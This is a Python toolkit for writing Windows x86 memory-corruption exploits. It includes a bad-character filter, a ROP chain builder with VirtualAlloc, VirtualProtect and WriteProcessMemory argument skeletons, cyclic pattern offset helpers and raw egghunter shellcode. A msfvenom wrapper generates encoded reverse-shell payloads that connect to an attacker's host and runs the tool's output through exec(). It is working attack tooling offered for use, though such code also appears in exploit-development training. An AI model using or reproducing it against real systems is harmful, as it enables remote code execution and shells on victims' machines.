from struct import pack
import socket
import subprocess

# Coloring
RED, GREEN, BLUE, MAGENTA, RESET = "\033[31m", "\033[32m", "\033[34m", "\033[35m", "\033[0m"
ERR, GOOD = f"{RED}[!]{RESET}", f"{GREEN}[+]{RESET}"

class BadChars:
    """
    A class to manage bad characters and provide a filtered list of valid bytes.
    """
    def __init__(self, additional:bytes = b''):
        """
        Args:
            additional (bytes, optional): Provide finded bad chars
        """        
        self.bad_chars = b'\x00'
        for c in additional:
            self.bad_chars += c.to_bytes()
    
    def getCharsArray(self) -> bytes:
        """Generate a bytes object of valid bytes, excluding bad characters.

        Returns:
        bytes: A bytes object containing all valid byte values (0-255), excluding those in self.bad_chars.
        """           
        all_possible_bytes =    (
            b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
            b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
            b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
            b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
            b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
            b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
            b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
            b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
            b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
            b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
            b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
            b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
            b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
            b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
            b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
        return bytes(c for c in all_possible_bytes if c not in self.bad_chars)

    def getBadChars(self) -> bytes:     
        return self.bad_chars

class RopDecoder:
    pass

class RopChain:
    """
    A class for building and manipulating Return-Oriented Programming (ROP) chains.
    To fetch raw bytes chain use .get()
    
    DO NOT INCLUDE SHELLCODE HERE
    """
    def __init__(self, base=0x0, pack_str='<I', chain=b'', junk_address=0x41414141):
        """
        Initializes the ROP chain.

        Parameters:
            base (int): A base address to add to relative addresses (default: 0x0).
            pack_str (str): Packing format for addresses (default: '<I', little-endian, 4-byte unsigned int).
            chain (bytes): Initial ROP chain (default: empty).
            junk_address (int): A junk slot in stack. Preferable a ret; instruction
        """
        self.__chain = chain
        self.__base = base
        self.__pack_str = pack_str
        self.__junk_address = junk_address
        self.__skeleton_shift = None
        self.__skeleton = None

    def __iadd__(self, other):
        """
        Adds an address or raw bytes to the chain.
        Used with += operation to chain object
        """
        if isinstance(other, int):
            self.__chain += pack(self.__pack_str,self.__base + other)
        elif isinstance(other, bytes):
            self.__chain += other
        else:
            raise NotImplementedError
        return self

    def __len__(self) -> int:
        return len(self.__chain)

    def addJunk(self, address:bytes = None):
        """
        Appends single junk address to the chain.

        Args:
            address (bytes, optional): Alternative junk address
        """        
        address = address or self.__junk_address
        self.__chain += pack(self.__pack_str, address)

    def get(self) -> bytes:
        self.__addSkeleton()
        return self.__chain

    def appendRaw(self, address: bytes):
        """
        Appends a raw address to the chain.
        """
        self.__chain += address
    
    def __addSkeleton(self):
        """
        Applies shift to the ROP chain and after this appends the skeleton
        """
        # if there is no skeleton - skip
        if self.__skeleton_shift is None or self.__skeleton is None or self.__skeleton == []:
            return
        
        rop_len = self.__len__()
        if rop_len > self.__skeleton_shift:
            print(f"{ERR} Too big ROP - Please INCREASE to atleast {rop_len}")
            print(f"ROP length: {rop_len}")
            print(f"skeleton shift: {self.__skeleton_shift}")
            raise SystemExit
        for _ in range((self.__skeleton_shift - rop_len)//4):
            self.addJunk()
        self.__chain += self.__skeleton

    def prepareSkeleton(self, shift: int, skeleton: list):
        """Skeleton examples&usage:
        
        prepareSkeleton(0x100, [0x41414141, 0x42424242])
        
        VirutalAlloc
        [
            0x41414141, # VirutalAlloc Address
            0x42424242, # Return Address
            0x43434343, # Shellcode Address
            0x00000001, # dwSize - !BADBYTES! will change whole page
            0x00001000, # flAllocationType - !BADBYTES! MEM_COMMIT
            0x00000040, # flProtect - !BADBYTES! PAGE_EXECUTE_READWRITE
        ]
        
        HeapCreate
        [
            0x41414141, # dummy HeapCreate Address
            0x42424242, # Return Address after HeapCreate
            0x43434343, # dummy flOptions
            0x44444444, # dummy dwInitialSize
            0x45454545, # dummy dwMaximumSize
        ]
        
        VirtualProtect
        [
            0x41414141, # dummy VirtualProtect Address
            0x42424242, # Return Address after VirtualProtect
            0x43434343, # dummy lpAddress
            0x44444444, # dummy dwSize
            0x45454545, # dummy flNewProtect
            0x46464646, # dummy lpflOldProtect
        ]
        
        WriteProcessMemory
        [
            0x41414141, # WriteProcessMemory Address
            0x42424242, # Return Address - executed after WriteProcessMemory
            0xFFFFFFFF, # hProcess - Pseudo handle = 0xFFFFFFFF points to current process
            0x44444444, # lpBaseAddress - same as Return Address
            0x45454545, # lpBuffer - address to our shellcode that will be copied
            0x46464646, # nSize - size of our shellcode
            0x47474747, # lpNumberOfBytesWritten - ANY writable address, it writes how much was saved
        ]
        
        Args:
            shift (int): How much bytes after beginning of the rop skeleton will be placed
            skeleton (list): List of dummy bytes for skeleton (unpacked)
        """
        self.__skeleton_shift = shift
        self.__skeleton = b''
        for s in skeleton:
            self.__skeleton += p32(s)
        pass
    

def checkForBadChars(buffer: bytes, bad_chars: bytes):
    i = 0
    for byte in buffer:
        if byte in bad_chars:
            print(f"{ERR} Wrong CHAR detected! Index: {i}")
            for a in range(i-8,i+8,1):
                if a == i:
                    print(f"---> {a}: {buffer[a]}")
                else:
                    print(f"{a}: {buffer[a]}")
            raise SystemExit
        i+=1


def p32(address: int|bytes, base=0x0, pack_str='<I') -> bytes:
        """
        Pack an address with an (optional base) little endian.

        Parameters:
            address (int|bytes): The address to pack.
            base (int): The base address to add to `address` (default: 0x0).
            pack_str (str): Packing format (default: '<I').

        Returns:
            bytes: Packed bytes of the address.
        """
        if isinstance(address, int):
            return pack(pack_str, base + address)
        else:
            return pack(pack_str, address)

def intToHex(value, width=0, uppercase=False):
    hex_value = f"{value:0{width}{'X' if uppercase else 'x'}}"
    return hex_value

def neg(value):
    return (-value) & 0xffffffff

def patternCreate(length = 8192):
    pattern = ''
    parts = ['A', 'a', '0']
    try:
        if not isinstance(length, int) and length.startswith('0x'):
            length = int(length, 16)
        elif not isinstance(length, int):
            length = int(length, 10)
    except ValueError:
        print(f"{ERR} PatternCreate - Wrong input")
        raise SystemExit
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern.encode('ascii')

def patternOffset(value:str, length = 8192):
    if not isinstance(value,str):
        print(f"{BLUE}Are you sure that you have entered string?{RESET}")
    try:
        if isinstance(value, str):
            if not value.startswith('0x'):
                value = '0x'+value
            value = pack("<L", (int(value, 0)))
    except ValueError:
        print(f"{ERR} PatternOffset - Wrong input")
        raise SystemExit
    pattern = patternCreate(length)
    try:
        print(f"{GOOD} offset = {pattern.index(value)}")
    except ValueError:
        print(f"{ERR} Not found")
        
    print(f"{MAGENTA}Please grab offset and remove this call from Exploit code{RESET}")
    raise SystemExit
    
def getEggHunterShellcodeSEH() -> bytes:
    """
    egghunter.py
    """
    return b"\xeb\x2a\x59\xb8\x77\x30\x30\x74\x51\x6a\xff\x31\xdb\x64\x89\x23\x83\xe9\x04\x83\xc3\x04\x64\x89\x0b\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xd1\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3"

def getEggHunterShellcode() -> bytes:
    return b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xCD\x29\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

def getMsfVenomShellcode(lhost, lport, payload="windows/shell_reverse_tcp", exitfunc='thread', nop_slide=16, badchars=b'') -> bytes:
    """Generate shellcode with msfvenom and return it."""
    try:
        if badchars == b'':
            # Run msfvenom to generate shellcode
            result = subprocess.run(
                [
                    "msfvenom",
                    "-p", f"{payload}",
                    f"LHOST={lhost}",
                    f"LPORT={lport}",
                    f"EXITFUNC={exitfunc}",
                    "-f", "python",
                    "-v", "shellcode"
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
        else:
            # escaped_string = badchars.decode("latin1").encode("unicode_escape").decode("ascii")
            # escaped_string = badchars.hex()
            l = badchars.hex()
            escaped_string = [l[i:i+2] for i in range(0, len(l), 2)]
            escaped_string = "\\x"+"\\x".join(escaped_string)
            print("msfvenom",
                    "-p", f"{payload}",
                    f"LHOST={lhost}",
                    f"LPORT={lport}",
                    f"EXITFUNC={exitfunc}",
                    "-e", "x86/shikata_ga_nai",
                    "-b", f"'{escaped_string}'",
                    "-f", "python",
                    "-v", "shellcode")
            result = subprocess.run(
                [
                    "msfvenom",
                    "-p", f"{payload}",
                    f"LHOST={lhost}",
                    f"LPORT={lport}",
                    f"EXITFUNC={exitfunc}",
                    "-e", "x86/shikata_ga_nai",
                    "-b", f"{escaped_string}",
                    "-f", "python",
                    "-v", "shellcode"
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
        
        # Check for errors
        if result.returncode != 0:
            raise RuntimeError(f"msfvenom failed: {result.stderr}")
        
        # Extract the generated shellcode from the output
        exec(result.stdout)  # Executes the Python variable definition
        print(result.stdout.replace('b""', 'b"\\x90"*'+str(nop_slide)))
        return (b'\x90'*nop_slide) + locals().get("shellcode", None)
    except Exception as e:
        print(f"Error generating shellcode: {e}")
        return None

def ascii_to_push_instructions(ascii_str):
    # Convert ASCII string to bytes
    byte_values = ascii_str.encode('ascii')
    # Split bytes into 4-byte chunks
    chunks = [byte_values[i:i+4] for i in range(0, len(byte_values), 4)]
    # Reverse the chunks and prepare push instructions
    push_instructions = []
    for chunk in chunks:
        # Fill the chunk with 0s if it has less than 4 bytes
        chunk = chunk.ljust(4, b'\x00')
        # Reverse the byte order and convert to hex
        reversed_chunk = int.from_bytes(chunk, byteorder='little')
        push_instructions.append(f"buf += p32(0x{reversed_chunk:08x})")
    # Reverse and print the push instructions
    push_instructions.reverse()
    for instruction in push_instructions:
        print(instruction)
